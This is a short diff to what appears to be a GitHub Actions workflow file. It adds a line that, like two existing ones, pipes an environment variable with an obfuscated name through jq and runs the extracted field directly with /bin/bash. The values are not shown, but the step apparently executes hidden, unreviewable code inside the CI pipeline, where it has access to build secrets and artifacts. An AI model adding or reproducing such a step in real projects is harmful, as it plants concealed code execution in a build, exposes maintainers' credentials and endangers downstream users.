@@ -20,6 +20,7 @@ jobs:
         run: |
           printf '%s' "$g85332" | jq -r .j0 | /bin/bash
           echo $gajek1 | jq -r .h5069 | /bin/bash
+          echo $t8442 | jq -r .t50 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
